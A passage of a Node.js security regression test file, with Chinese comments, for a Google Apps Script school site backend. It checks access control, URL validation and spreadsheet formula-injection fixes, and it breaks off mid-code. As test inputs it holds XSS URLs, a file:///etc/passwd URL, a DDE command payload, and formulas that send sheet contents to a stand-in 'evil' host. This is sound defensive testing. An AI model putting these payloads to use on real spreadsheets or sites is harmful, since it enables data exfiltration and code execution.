// 紅隊檢查（2026-10-23）的修補測試：H-1 匿名者經 google.script.run 呼叫公開函式、M-1 後端網址欄位驗證、
// M-2 登入鎖定不能被攻擊者拿來鎖死老師（受信任裝置）、M-3 試算表公式注入。以模擬的 Apps Script 環境執行，不碰真實資料。
// 執行：node tests/security.test.js
const fs = require('fs'), vm = require('vm'), path = require('path');
const src = fs.readFileSync(path.join(__dirname, '..', 'Code.js'), 'utf8');
let pass = 0, fail = 0;
const ok = (c, m) => { if (c) { pass++; console.log('  ✓', m); } else { fail++; console.log('  ✗ FAIL:', m); } };
const eq = (a, b) => JSON.stringify(a) === JSON.stringify(b);

// ---------- 靜態分析：頂層函式 ----------
function topLevelFunctions() {
  const re = /^function ([A-Za-z0-9_$]+)\s*\(([^)]*)\)\s*\{/gm; let m; const fns = [];
  while ((m = re.exec(src))) fns.push({ name: m[1], args: m[2], start: m.index });
  fns.forEach((f, i) => { f.body = src.slice(f.start, i + 1 < fns.length ? fns[i + 1].start : src.length); });
  return fns;
}
const firstStatement = f => f.body.split('\n').slice(1).map(l => l.trim()).filter(l => l && !/^(\/\/|\/\*|\*)/.test(l))[0] || '';

console.log('H-1. 公開函式白名單（名稱沒有結尾底線的函式，匿名者可經 google.script.run 呼叫）');
const fns = topLevelFunctions();
const pub = fns.filter(f => !f.name.endsWith('_'));
const ENTRY = ['doGet', 'doPost', 'onOpen'];
const READ_API = ['getAppData', 'getTextMap', 'getAlbums', 'getAlbumPhotos'];   // 匿名唯讀 API（前台需要）
const LOGIN = ['verifyPassword', 'adminLogout'];                                                       // 登入／登出本來就不需要 token
const TRIGGERS = ['weeklyBackup', 'warmAppDataCache'];                                                  // 時間觸發器的處理函式（名稱必須公開）
const OWNER_ONLY = ['setupWeeklyBackupTrigger', 'setupWarmCacheTrigger'];                              // 編輯器手動執行（名稱必須公開）
const MENU = pub.filter(f => /^menu[A-Z]/.test(f.name)).map(f => f.name).concat(['openWebApp']);
const allowed = new Set([].concat(ENTRY, READ_API, LOGIN, TRIGGERS, OWNER_ONLY, MENU));
const stray = pub.filter(f => !allowed.has(f.name) && !/checkPassword\(/.test(f.body)).map(f => f.name);
ok(stray.length === 0, '每個公開函式不是在白名單裡，就是函式內有 token 驗證（checkPassword）。沒有白名單也沒驗證的：' + (stray.join('、') || '無'));
const guardedLate = pub.filter(f => !allowed.has(f.name) && f.name !== 'checkPassword').filter(f => {
  const b = f.body, a = b.indexOf('checkPassword(');
  const hits = ['getSpreadsheet_(', 'DriveApp.', 'SpreadsheetApp.', 'UrlFetchApp.', 'PropertiesService', 'LockService'].map(k => b.indexOf(k)).filter(i => i >= 0);
  return a >= 0 && hits.length && Math.min.apply(null, hits) < a;
}).map(f => f.name);
ok(guardedLate.length === 0, '有驗證的公開函式：驗證在碰試算表、Drive、網路、鎖之前（先碰資源再驗證的：' + (guardedLate.join('、') || '無') + '）');
ok(pub.length < 90 && pub.some(f => f.name === 'saveEvent'), '（健全性）有掃到後台函式（共 ' + pub.length + ' 個公開函式）');
const MOVED = ['clearAppDataCache', 'getSongsData', 'batchUpdateSongDurations', 'syncAllSongDurations', 'fetchYouTubeDuration', 'extractYouTubeId', 'formatSecondsToMmSs', 'ensureSpotlightSheetHeaders', 'ensureSongSheetsExist', 'ensureThemeSheetsExist', 'ensureAlbumSheetsExist', 'ensureDatabaseInitialized', 'parseThemeJsonArray', 'getThemesData', 'normalizeDateString', 'getSheetDataAsObjects', 'getSettingsObject', 'getSpreadsheet', 'getActivityFolder'];
ok(MOVED.every(n => !fns.some(f => f.name === n) && fns.some(f => f.name === n + '_')), '原本公開且沒有驗證的 19 個函式已改成私有（名稱結尾加底線）：' + MOVED.length + ' 個');
ok(MENU.every(n => /^(const|let|var) \w+ = SpreadsheetApp\.getUi\(\);/.test(firstStatement(fns.find(f => f.name === n)))) && /^(const|let|var) \w+ = SpreadsheetApp\.getUi\(\);/.test(firstStatement(fns.find(f => f.name === 'onOpen'))), '選單函式與 onOpen：第一個動作就是取得 UI（網頁環境沒有 UI 會直接失敗，不會先做任何工作）：' + MENU.length + ' 個選單函式＋onOpen');
ok(OWNER_ONLY.every(n => firstStatement(fns.find(f => f.name === n)) === 'requireOwnerContext_();'), '編輯器手動執行的函式：第一個動作是 requireOwnerContext_()');
ok(/isBackupRecent_\(\)/.test(fns.find(f => f.name === 'weeklyBackup').body.split('\n').slice(0, 4).join('\n')), 'weeklyBackup：一開始就檢查備份間隔（匿名者無法連續備份）');
ok(!/action === 'ensureAlbumSheets'|action === 'initAlbumSheets'/.test(src), '未使用且不需登入的 POST 路由 ensureAlbumSheets／initAlbumSheets 已移除');

// ---------- 模擬環境 ----------
function mkEnv(opts) {
  opts = opts || {};
  const calls = { getUi: 0, ensure: 0, clear: 0, ss: 0, backups: 0, triggers: 0, warmReads: 0 };
  const store = {}; const props = {};
  const cache = { get: k => k in store ? store[k] : null, put: (k, v) => { store[k] = String(v); }, remove: k => { delete store[k]; }, putAll() {}, removeAll() {} };
  const triggers = [];
  const ctx = {
    console: { log() {}, warn() {}, error() {} },
    CacheService: { getScriptCache: () => cache },
    PropertiesService: { getScriptProperties: () => ({ getProperty: k => (k in props ? props[k] : null), setProperty: (k, v) => { props[k] = String(v); }, deleteProperty: k => { delete props[k]; } }) },
    LockService: { getScriptLock: () => ({ tryLock: () => true, releaseLock() {} }) },
    Session: { getActiveUser: () => ({ getEmail: () => opts.active === undefined ? '' : opts.active }), getEffectiveUser: () => ({ getEmail: () => opts.effective === undefined ? 'owner@example.test' : opts.effective }) },
    SpreadsheetApp: { getUi: () => { calls.getUi++; throw new Error('Cannot call SpreadsheetApp.getUi() from this context.'); } },
    ScriptApp: { getProjectTriggers: () => triggers, deleteTrigger() {}, WeekDay: { SUNDAY: 1 }, newTrigger: fn => { const b = { timeBased: () => b, everyMinutes: () => b, onWeekDay: () => b, atHour: () => b, create: () => { calls.triggers++; triggers.push({ getHandlerFunction: () => fn }); } }; return b; } },
    Utilities: { getUuid: () => 'u' + Math.random().toString(16).slice(2) + 'x'.repeat(8), formatDate: () => '2026-10-23', computeDigest: (alg, v) => Array.from(require('crypto').createHash('sha256').update(String(v)).digest()), DigestAlgorithm: { SHA_256: 'SHA_256' }, base64Encode: b => Buffer.from(b).toString('base64') },
    DriveApp: {}, HtmlService: { createHtmlOutput: () => ({ setXFrameOptionsMode() { return this; }, setTitle() { return this; }, addMetaTag() { return this; } }), XFrameOptionsMode: { ALLOWALL: 1 } }, UrlFetchApp: {},
    ContentService: { MimeType: { JSON: 'JSON' }, createTextOutput: t => ({ text: t, setMimeType(m) { this.mime = m; return this; } }) }
  };
  vm.createContext(ctx); vm.runInContext(src, ctx);
  ctx.getSpreadsheet_ = () => { calls.ss++; if (opts.noSheet) return null; return opts.ss || null; };
  ctx.ensureAlbumSheetsExist_ = () => { calls.ensure++; return { message: 'ok' }; };
  const realClear = ctx.clearAppDataCache_; ctx.clearAppDataCache_ = () => { calls.clear++; };
  ctx.backupSpreadsheet_ = () => { calls.backups++; props.LAST_BACKUP_AT = String(Date.now()); return { name: 'n' }; };
  return { ctx, calls, store, props, triggers };
}

console.log('H-1. 匿名者（網頁環境）呼叫公開名稱：沒有任何副作用');
['menuClearCache', 'menuEnsureAlbumSheets', 'menuSetupWarmCache', 'onOpen', 'openWebApp'].forEach(n => {
  const e = mkEnv(); let threw = false; try { e.ctx[n](); } catch (x) { threw = true; }
  ok(threw && e.calls.getUi === 1 && e.calls.clear === 0 && e.calls.ensure === 0 && e.calls.ss === 0 && e.calls.triggers === 0, n + '：沒有 UI 就拋錯，且沒有清快取、沒有檢查工作表、沒有開試算表、沒有建觸發器');
});
['menuBackupNow', 'menuSyncSongAccess', 'menuSyncNameMap', 'menuSyncTextMap', 'menuDraftTextMap', 'menuAdoptTextDrafts', 'menuRebuildCoverCandidates', 'menuResetLoginLock', 'menuResetDatabase'].forEach(n => {
  const e = mkEnv(); let threw = false; try { e.ctx[n](); } catch (x) { threw = true; }
  ok(threw && e.calls.ss === 0 && e.calls.backups === 0 && e.calls.clear === 0, n + '：沒有 UI 就拋錯，沒有任何工作被執行');
});
(function () {
  const e = mkEnv({ active: '', effective: 'owner@example.test' });
  let t1 = false, t2 = false; try { e.ctx.setupWarmCacheTrigger(); } catch (x) { t1 = true; } try { e.ctx.setupWeeklyBackupTrigger(); } catch (x) { t2 = true; }
  ok(t1 && t2 && e.calls.triggers === 0 && e.calls.backups === 0 && e.calls.ss === 0, '匿名者（active 為空）呼叫 setup 函式：拒絕，沒有建立觸發器、沒有備份、沒有開試算表');
  const e2 = mkEnv({ active: 'someone@else.test', effective: 'owner@example.test' });
  let t3 = false; try { e2.ctx.setupWarmCacheTrigger(); } catch (x) { t3 = true; } ok(t3 && e2.calls.triggers === 0, '登入的其他人（active ≠ 擁有者）：拒絕');
  const e3 = mkEnv({ active: '', effective: '' }); let t4 = false; try { e3.ctx.setupWarmCacheTrigger(); } catch (x) { t4 = true; } ok(t4, '兩邊都是空的（取不到身分）：拒絕（不放行）');
  const e4 = mkEnv(); e4.ctx.Session = { getActiveUser: () => { throw new Error('boom'); }, getEffectiveUser: () => ({ getEmail: () => 'o@x' }) };
  let t5 = false; try { e4.ctx.requireOwnerContext_(); } catch (x) { t5 = true; } ok(t5, '讀取身分時出錯：拒絕（不放行）');
  const e5 = mkEnv({ active: 'owner@example.test', effective: 'owner@example.test' });
  e5.ctx.getAppData = () => ({ success: true }); e5.ctx.getTextMap = () => ({}); e5.ctx.warmAlbumPhotos_ = () => {}; e5.ctx.clearTextMapCache_ = () => {};
  let t6 = false; try { e5.ctx.setupWarmCacheTrigger(); } catch (x) { t6 = true; } ok(!t6 && e5.calls.triggers === 1, '擁有者本人（active ＝ 擁有者）：照常建立觸發器');
  const e6 = mkEnv({ active: 'owner@example.test', effective: 'owner@example.test' }); e6.ctx.getAppData = () => ({}); e6.ctx.getTextMap = () => ({}); e6.ctx.warmAlbumPhotos_ = () => {}; e6.ctx.clearTextMapCache_ = () => {};
  e6.ctx.setupWeeklyBackupTrigger(); ok(e6.calls.backups === 1 && e6.calls.triggers === 1, '擁有者：setupWeeklyBackupTrigger 照常備份並建立觸發器');
})();
(function () {
  const e = mkEnv(); let reads = 0;
  e.ctx.getAppData = () => { reads++; return { success: true }; }; e.ctx.getTextMap = () => ({}); e.ctx.warmAlbumPhotos_ = () => {}; e.ctx.clearTextMapCache_ = () => {};
  e.ctx.warmAppDataCache(); e.ctx.warmAppDataCache(); e.ctx.warmAppDataCache();
  ok(reads === 1, '預熱節流：連續呼叫 3 次只重建 1 次（匿名者無法反覆觸發整份試算表重讀；實際：' + reads + '）');
  delete e.store.warm_recent; e.ctx.warmAppDataCache(); ok(reads === 2, '過了節流時間（快取鍵到期）：下一次觸發器照常重建');
  ok(Number(/cache\.put\('warm_recent', '1', (\d+)\)|guard\.put\('warm_recent', '1', (\d+)\)/.exec(src).slice(1).find(Boolean)) < 300, '節流時間小於觸發器間隔（5 分鐘），觸發器不會被自己擋掉');
})();
(function () {
  const e = mkEnv(); const post = body => JSON.parse(e.ctx.doPost({ postData: { contents: JSON.stringify(body) } }).text);
  let r = post({ action: 'ensureAlbumSheets' });
  ok(r.success === false && r.authExpired === true && e.calls.ensure === 0 && e.calls.ss === 0, '已移除的 POST 動作 ensureAlbumSheets：沒有 token 先被拒絕，沒有碰試算表');
  e.ctx.checkPassword = p => p === 'tok'; r = post({ action: 'ensureAlbumSheets', password: 'tok' });
  ok(r.success === false && /未知/.test(r.error) && e.calls.ensure === 0 && e.calls.ss === 0, '已移除的 POST 動作 ensureAlbumSheets：即使有 token 也回「未知 POST 動作」，沒有碰試算表');
  ok(MOVED.every(n => e.ctx[n] === undefined), '舊的公開名稱在執行環境裡都不存在了（google.script.run 呼叫不到）');
})();

// ---------- 試算表模擬（M-1、M-3 用）----------
function mkSheet(rows) {
  const sh = { rows: rows.map(r => r.slice()), formats: {}, writes: [] };
  const width = () => sh.rows.reduce((m, r) => Math.max(m, r.length), 0);
  const cell = (r, c) => ((sh.rows[r - 1] || [])[c - 1] === undefined ? '' : sh.rows[r - 1][c - 1]);
  sh.getLastRow = () => sh.rows.length; sh.getLastColumn = () => width();
  sh.getDataRange = () => ({ getValues: () => sh.rows.map(r => { const c = r.slice(); while (c.length < width()) c.push(''); return c; }) });
  sh.getRange = (r, c, nr, nc) => {
    const R = nr || 1, C = nc || 1;
    const self = {
      getValues: () => { const out = []; for (let i = 0; i < R; i++) { const row = []; for (let j = 0; j < C; j++) row.push(cell(r + i, c + j)); out.push(row); } return out; },
      setValue(v) { return self.setValues([[v]]); },
      setValues(vals) { for (let i = 0; i < vals.length; i++) { while (sh.rows.length < r + i) sh.rows.push([]); const row = sh.rows[r - 1 + i]; for (let j = 0; j < vals[i].length; j++) { while (row.length < c + j) row.push(''); row[c - 1 + j] = vals[i][j]; sh.writes.push(vals[i][j]); } } return self; },
      setNumberFormat(f) { sh.formats[r + ',' + c] = f; return self; }, setFontWeight() { return self; }, setBackground() { return self; }
    };
    return self;
  };
  sh.appendRow = row => { sh.rows.push(row.slice()); row.forEach(v => sh.writes.push(v)); };
  sh.deleteRow = r => { sh.rows.splice(r - 1, 1); }; sh.insertColumnAfter = () => {}; sh.autoResizeColumns = () => {}; sh.setFrozenRows = () => {};
  return sh;
}
function mkSsEnv(sheets, opts) {
  const book = {}; Object.keys(sheets).forEach(k => { book[k] = mkSheet(sheets[k]); });
  const e = mkEnv(opts);
  const ss = { getSheetByName: n => book[n] || null, insertSheet: n => { book[n] = mkSheet([]); return book[n]; } };
  e.ctx.getSpreadsheet_ = () => ss; e.ctx.checkPassword = p => p === 'tok'; e.ctx.clearAppDataCache_ = () => { e.calls.clear++; };
  e.book = book; return e;
}
const DOC_HDR = ['id', 'fileName', 'category', 'description', 'driveFileId', 'downloadUrl', 'updatedAt'];

console.log('M-1. 後端：之後會被前台當成連結的欄位必須是 http(s) 網址（不含空白與控制字元）');
(function () {
  const e = mkEnv(); const U = e.ctx.checkStoredUrl_;
  ok(typeof U === 'function', 'checkStoredUrl_ 存在');
  ['https://drive.google.com/file/d/ABC/view?usp=sharing', 'http://example.test/a', 'HTTPS://X.TEST/A', ''].forEach(u => ok(U(u).error === undefined, '合法或空白：' + JSON.stringify(u)));
  ok(U('  https://x.test/a  ').value === 'https://x.test/a' && U(null).value === '' && U(undefined).value === '', '前後空白去掉；null、undefined 當空白');
  ['javascript:alert(1)', 'java\tscript:alert(1)', 'java\nscript:alert(1)', 'java\rscript:alert(1)', '\u0000javascript:alert(1)', 'JaVaScRiPt:alert(1)', 'vbscript:x', 'data:text/html,<script>alert(1)</script>', 'ftp://x.test/a', 'file:///etc/passwd', '//x.test/a', 'https://a b', 'https://x.test/\u0009x', 'https://', 'drive.google.com/x', 'mailto:a@b.c', 'https://x.test/' + 'a'.repeat(2100), 5, {}, ['https://x.test']].forEach(u => ok(!!U(u).error, '拒絕：' + JSON.stringify(String(u)).slice(0, 50)));
  ok(U('spotlight-fluoride.jpg', { allowRelative: true }).value === 'spotlight-fluoride.jpg' && !!U('spotlight-fluoride.jpg').error, '相對路徑：只有明確允許的欄位（焦點活動圖片）才接受');
  ok(!!U('java\tscript:alert(1)', { allowRelative: true }).error && !!U('javascript:alert(1)', { allowRelative: true }).error && !!U('a b.jpg', { allowRelative: true }).error, '即使允許相對路徑：夾 Tab 的 javascript:、含空白的路徑仍然拒絕');
  ok(U('data:image/png;base64,AAAA', { allowDataImage: true }).value === 'data:image/png;base64,AAAA' && !!U('data:image/png;base64,AAAA').error && !!U('data:text/html,x', { allowDataImage: true }).error, 'data:image 只有明確允許的欄位才接受，data:text 永遠拒絕');
})();
(function () {
  const e = mkSsEnv({ Docs: [DOC_HDR] }); const snap = JSON.stringify(e.book.Docs.rows);
  const bad = e.ctx.saveDoc({ id: 'D1', fileName: 'x', downloadUrl: 'java\tscript:alert(1)' }, 'tok');
  ok(bad.success === false && /連結|網址/.test(bad.error) && JSON.stringify(e.book.Docs.rows) === snap, 'saveDoc：夾 Tab 的 javascript: 下載連結 → 拒絕，試算表不動');
  const good = e.ctx.saveDoc({ id: 'D2', fileName: 'x', downloadUrl: '  https://drive.google.com/file/d/ABC/view  ' }, 'tok');
  ok(good.success && e.book.Docs.rows[1][e.book.Docs.rows[0].indexOf('downloadUrl')] === 'https://drive.google.com/file/d/ABC/view', 'saveDoc：合法連結（去前後空白）照存');
  const none = e.ctx.saveDoc({ id: 'D3', fileName: 'x' }, 'tok'); ok(none.success, 'saveDoc：沒有連結（空白）照存');
})();
(function () {
  const SONG_HDR = ['id', 'category', 'title', 'youtubeUrl', 'youtubeId', 'duration', 'fileName', 'fileSize', 'driveFileId', 'downloadUrl', 'updatedAt', 'noDownload'];
  const e = mkSsEnv({ Songs: [SONG_HDR], SongCategories: [['categoryName']] });
  e.ctx.ensureSongSheetsExist_ = () => ({ songSheet: e.book.Songs, catSheet: e.book.SongCategories });
  e.ctx.fetchYouTubeDuration_ = () => '01:00';
  const snap = JSON.stringify(e.book.Songs.rows);
  let r = e.ctx.saveSong({ id: 'S1', title: 't', youtubeUrl: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ', downloadUrl: 'java\nscript:alert(1)' }, 'tok');
  ok(r.success === false && JSON.stringify(e.book.Songs.rows) === snap, 'saveSong：夾換行的 javascript: 下載連結 → 拒絕，試算表不動');
  r = e.ctx.saveSong({ id: 'S2', title: 't', youtubeUrl: 'javascript:alert(1)//?v=dQw4w9WgXcQ' }, 'tok');
  ok(r.success === false && /必須是 http/.test(r.error) && JSON.stringify(e.book.Songs.rows) === snap, 'saveSong：YouTube 連結不是 http(s) → 拒絕，並說明是網址格式的問題（即使裡面含有 11 字元的影片代號）：' + r.error);
  r = e.ctx.saveSong({ id: 'S3', title: 't', youtubeUrl: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ', downloadUrl: 'https://drive.google.com/uc?export=download&id=ABC' }, 'tok');
  ok(r.success === true, 'saveSong：合法的連結照存');
})();
(function () {
  const SP_HDR = ['id', 'title', 'subtitle', 'imageUrl', 'mediaType', 'tags', 'bulletPoints', 'startDate', 'endDate', 'duration', 'priority', 'status'];
  const e = mkSsEnv({ Spotlight: [SP_HDR] }); e.ctx.ensureSpotlightSheetHeaders_ = () => {};
  const snap = JSON.stringify(e.book.Spotlight.rows);
  let r = e.ctx.saveSpotlight({ id: 'SP1', title: 't', imageUrl: 'java\tscript:alert(1)' }, 'tok');
  ok(r.success === false && JSON.stringify(e.book.Spotlight.rows) === snap, 'saveSpotlight：夾 Tab 的 javascript: 圖片網址 → 拒絕');
  r = e.ctx.saveSpotlight({ id: 'SP2', title: 't', imageUrl: 'spotlight-fluoride.jpg' }, 'tok'); ok(r.success === true, 'saveSpotlight：相對路徑（網站自己的圖片 spotlight-fluoride.jpg）照存');
  r = e.ctx.saveSpotlight({ id: 'SP3', title: 't', imageUrl: 'https://drive.google.com/thumbnail?id=ABC&sz=w1600' }, 'tok'); ok(r.success === true, 'saveSpotlight：Drive 縮圖網址照存');
  r = e.ctx.saveSpotlight({ id: 'SP4', title: 't' }, 'tok'); ok(r.success === true, 'saveSpotlight：沒有圖片網址照存');
})();

console.log('M-3. 試算表公式注入：寫進儲存格的文字不能被當成公式');
(function () {
  const e = mkEnv(); const N = e.ctx.neutralizeFormulas_;
  ok(typeof N === 'function', 'neutralizeFormulas_ 存在');
  ['=1+1', '=HYPERLINK("http://evil/?p="&Settings!B2)', '=IMPORTDATA("http://evil")', '+1+1', '+886 2 2668 8249', '-1+1', '-cmd|\' /C calc\'!A0', '@SUM(A1)', '\t=1+1', '\r=1+1'].forEach(t => ok(N(t) === "'" + t, '開頭是公式字元：前面加 \'（' + JSON.stringify(t).slice(0, 34) + '）'));
  ['一般文字', '2026-10-23', '10:00 至 12:20', 'a=b', 'x+y', '', ' =1+1', '諾貝爾 A 班', "'已經有撇號"].forEach(t => ok(N(t) === t, '一般文字原樣：' + JSON.stringify(t)));
  ok(N(5) === 5 && N(true) === true && N(null) === null && N(undefined) === undefined, '數字、布林、null 不動');
  const input = { data: { title: '=1+1', note: '+cmd', n: 3, tags: ['=a', 'ok', ['@b']], nested: { deep: '-x' } }, password: '=secret', deviceKey: '+key', idempotencyKey: '=idem', requestId: '@r', action: 'saveEvent', kind: '=x', file: { name: '=f', base64: '+AAA' }, files: [{ name: '=cmd.zip' }], settings: { A: '=a' }, list: [{ name: '=obj' }] };
  const snap = JSON.stringify(input); const out = N(input);
  ok(JSON.stringify(input) === snap, '不改動傳入的物件');
  ok(out.data.title === "'=1+1" && out.data.note === "'+cmd" && out.data.n === 3 && eq(out.data.tags, ["'=a", 'ok', ["'@b"]]) && out.data.nested.deep === "'-x", '資料物件的文字欄位（含字串陣列、巢狀物件）都處理');
  ok(out.password === '=secret' && out.deviceKey === '+key' && out.idempotencyKey === '=idem' && out.requestId === '@r' && out.action === 'saveEvent' && out.kind === '=x', '密碼、裝置金鑰、冪等編號、requestId、action、kind 不處理（它們不會被寫進試算表，改了會壞）');
  ok(eq(N({ base64: '+AAA', files: ['=a', '+b'] }), { base64: '+AAA', files: ['=a', '+b'] }), '最上層的 base64 欄位、字串陣列的 files 欄位：不處理');
  ok(out.file.base64 === '+AAA' && out.file.name === '=f' && eq(out.files, [{ name: '=cmd.zip' }]) && eq(out.list, [{ name: '=obj' }]), '上傳檔案內容（base64 可以合法地以 + 開頭）、檔案清單（會存成 JSON 文字，不會被當公式）、物件陣列：不處理');
  ok(eq(N({ settings: { A: '=a' }, titles: { footerContact: '+886 2 2668 8249' }, changes: [{ zh: '=a', en: '=b' }], zhList: ['=a'] }), { settings: { A: '=a' }, titles: { footerContact: '+886 2 2668 8249' }, changes: [{ zh: '=a', en: '=b' }], zhList: ['=a'] }), 'settings、介面標題 titles、英文對照 changes／zhList 不在這裡處理（各自以純文字格式或 textCellSafe_ 寫入；再加撇號會讓撇號變成內容的一部分）');
  let deep = '=x'; for (let i = 0; i < 10; i++) deep = { v: deep }; let threw = false; try { N(deep); } catch (x) { threw = true; } ok(!threw, '很深的巢狀物件：不拋錯');
})();
(function () {
  const e = mkSsEnv({ Docs: [DOC_HDR] }); const post = body => JSON.parse(e.ctx.doPost({ postData: { contents: JSON.stringify(body) } }).text);
  const col = h => e.book.Docs.rows[0].indexOf(h);
  let r = post({ action: 'saveDoc', password: 'tok', docData: { id: 'D1', fileName: '=HYPERLINK("http://evil/?p="&Settings!B2)', category: '@SUM(A1)', description: '+cmd|calc' } });
  const row = e.book.Docs.rows.find(x => x[0] === 'D1');
  ok(r.success && row[col('fileName')] === "'=HYPERLINK(\"http://evil/?p=\"&Settings!B2)" && row[col('category')] === "'@SUM(A1)" && row[col('description')] === "'+cmd|calc", 'doPost saveDoc：文件名稱、分類、說明裡的公式都被前置 \' 變成純文字');
  r = post({ action: 'saveDoc', password: 'tok', docData: { id: 'D2', fileName: '正常名稱', files: [{ name: '=cmd.zip', ext: 'zip', driveFileId: '', downloadUrl: 'https://x.test/a', size: 1 }] } });
  const f = e.book.Docs.rows.find(x => x[0] === 'D2')[col('files')];
  ok(r.success && /^\[/.test(f) && JSON.parse(f)[0].name === '=cmd.zip', '檔案清單（JSON 文字，開頭是 [）：檔名原樣，不會被加上撇號');
  ok(e.book.Docs.writes.every(w => typeof w !== 'string' || !/^[=+\-@]/.test(w) || /^'/.test(w) === false), '（對照）所有寫進試算表的字串都不是以公式字元開頭');
})();
(function () {
  const SP_HDR = ['id', 'title', 'subtitle', 'imageUrl', 'mediaType', 'tags', 'bulletPoints', 'startDate', 'endDate', 'duration', 'priority', 'status'];
  const e = mkSsEnv({ Spotlight: [SP_HDR] }); e.ctx.ensureSpotlightSheetHeaders_ = () => {};
  const post = body => JSON.parse(e.ctx.doPost({ postData: { contents: JSON.stringify(body) } }).text);
  post({ action: 'saveSpotlight', password: 'tok', data: { id: 'SP1', title: '=cmd', subtitle: '-1+1', tags: '@x', bulletPoints: '+y', priority: 3 } });
  const row = e.book.Spotlight.rows.find(x => x[0] === 'SP1');
  ok(row[1] === "'=cmd" && row[2] === "'-1+1" && row[5] === "'@x" && row[6] === "'+y" && row[10] === 3, 'doPost saveSpotlight：每個文字欄位都處理，數字欄位（順位）不動');
  const ev = mkSsEnv({ Docs: [DOC_HDR] }); const before = ev.ctx.doPost({ parameter: { payload: JSON.stringify({ action: 'saveDoc', password: 'tok', docData: { id: 'F1', fileName: '=1+1' } }) } });
  ok(ev.book.Docs.rows.find(x => x[0] === 'F1')[1] === "'=1+1", 'iframe 表單模式（payload 欄位）的請求也一樣處理');
})();
(function () {
  const SET = [['key', 'value', 'description'], ['TICKER_MESSAGE', '歡迎', ''], ['ADMIN_PASSWORD', 'old-password-123', '']];
  const e = mkSsEnv({ Settings: SET }); const post = body => JSON.parse(e.ctx.doPost({ postData: { contents: JSON.stringify(body) } }).text);
  let r = post({ action: 'updateSettings', password: 'tok', settings: { TICKER_MESSAGE: '=IMPORTDATA("http://evil/?"&Settings!B3)' } });
  const rows = e.book.Settings.rows; const idx = rows.findIndex(x => x[0] === 'TICKER_MESSAGE') + 1;
  ok(r.success && rows[idx - 1][1] === '=IMPORTDATA("http://evil/?"&Settings!B3)' && e.book.Settings.formats[idx + ',2'] === '@', 'updateSettings：儲存格先設成純文字格式再寫入（內容原樣，不會變成公式）');
  r = post({ action: 'updateSettings', password: 'tok', settings: { ADMIN_PASSWORD: '+Strong-Password-2026' } });
  const pidx = rows.findIndex(x => x[0] === 'ADMIN_PASSWORD') + 1;
  ok(r.success && rows[pidx - 1][1] === '+Strong-Password-2026' && e.book.Settings.formats[pidx + ',2'] === '@', '新密碼以 + 開頭：原樣存成文字（沒有多出撇號，之後登入比對才會對）');
})();
(function () {
  ok(/postData\s*=\s*neutralizeFormulas_\(postData\)/.test(src), 'doPost 在解析請求之後、分派動作之前，統一處理所有動作的文字欄位');
  const i = src.indexOf('const FORMULA_SKIP_KEYS_'), j = src.indexOf('};', i); const keys = (src.slice(i, j).match(/(\w+):\s*1/g) || []).map(x => x.split(':')[0]);
  ok(['data', 'docData', 'songData', 'albumData', 'album', 'meta', 'themeData', 'taskData', 'title', 'description', 'fileName', 'category', 'semester', 'link', 'fromSemester', 'toSemester', 'fromYear', 'toYear', 'orderList', 'ids', 'tabs'].every(k => keys.indexOf(k) === -1), '不處理的欄位清單裡沒有任何「會被寫進試算表」的資料欄位（略過清單：' + keys.join('、') + '）');
})();

console.log('M-4. getActivityImages（列出 Acticity 資料夾所有圖片）必須登入才能呼叫');
(function () {
  const fn = topLevelFunctions().find(f => f.name === 'getActivityImages');
  ok(fn && /^if \(!checkPassword\(password\)\) return authFail_\(\);/.test(firstStatement(fn)) && /^function getActivityImages\(password\)/.test(fn.body), 'getActivityImages(password)：第一個動作是驗證 token，沒有白名單例外（匿名函式清單不再列它）');
  const e = mkSsEnv({}); let touched = 0;
  e.ctx.getActivityFolder_ = () => { touched++; return { getUrl: () => 'u', getFiles: () => ({ hasNext: () => false }) }; };
  let r = e.ctx.getActivityImages(); ok(r.success === false && r.authExpired === true && touched === 0, '不帶 token（匿名經 google.script.run）：被拒絕，沒有碰 Drive');
  r = e.ctx.getActivityImages('bogus'); ok(r.success === false && r.authExpired === true && touched === 0, '假 token：被拒絕，沒有碰 Drive');
  r = e.ctx.getActivityImages('tok'); ok(r.success === true && touched === 1 && Array.isArray(r.files), '正確 token：照常列出');
  const doGet = q => JSON.parse(e.ctx.doGet({ parameter: q }).text);
  touched = 0; r = doGet({ action: 'getActivityImages' }); ok(r.success === false && r.error === '未知動作' && touched === 0, 'GET ?action=getActivityImages：不再提供（回「未知動作」，沒有碰 Drive）');
  r = doGet({ action: 'getActivityImages', password: 'tok', token: 'tok' }); ok(r.success === false && touched === 0, 'GET 即使帶 token 參數也不提供（token 不該出現在網址）');
  const post = body => JSON.parse(e.ctx.doPost({ postData: { contents: JSON.stringify(body) } }).text);
  r = post({ action: 'getActivityImages' }); ok(r.success === false && r.authExpired === true && touched === 0, 'POST 不帶 token：被拒絕');
  r = post({ action: 'getActivityImages', password: 'bogus' }); ok(r.success === false && r.authExpired === true && touched === 0, 'POST 假 token：被拒絕');
  r = post({ action: 'getActivityImages', password: 'tok' }); ok(r.success === true && touched === 1, 'POST 正確 token：回傳圖片清單');
  ok(!/action === 'getActivityImages'[\s\S]{0,80}getActivityImages\(\)/.test(src), '後端沒有任何路徑以無參數呼叫 getActivityImages()');
})();
(function () {
  const fe = fs.readFileSync(path.join(__dirname, '..', 'build_index.js'), 'utf8');
  ok(/runner\.getActivityImages\(payload\.password\)/.test(fe), '前端（google.script.run 模式）：把 token 傳給後端');
  ok(/callBackend\('getActivityImages', \{ password: state\.adminPassword \}/.test(fe), '前端：後台選圖視窗呼叫時帶 token');
  const m = fe.match(/if \(action === 'getAppData' \|\| [^)]*\) \{/);
  ok(m && m[0].indexOf('getActivityImages') < 0, '前端（外部環境）：getActivityImages 不再走匿名 GET，改走 POST');
  ok(/action !== 'getActivityImages'/.test(fe), '前端：getActivityImages 不附冪等編號（它是讀取，不是寫入）');
})();

// ================= L-1～L-4（低風險項目補強）=================
function lockEnv(opts) {
  opts = opts || {};
  const e = mkSsEnv(opts.sheets || {});
  e.ev = []; e.lock = { tries: 0, released: 0, busy: false };
  e.ctx.LockService = { getScriptLock: () => ({ tryLock: () => { e.lock.tries++; e.ev.push('lock'); if (e.lock.busy) return false; return true; }, releaseLock: () => { e.lock.released++; e.ev.push('unlock'); } }) };
  const base = {}; const raw = e.ctx.CacheService.getScriptCache();
  e.ctx.CacheService = { getScriptCache: () => ({
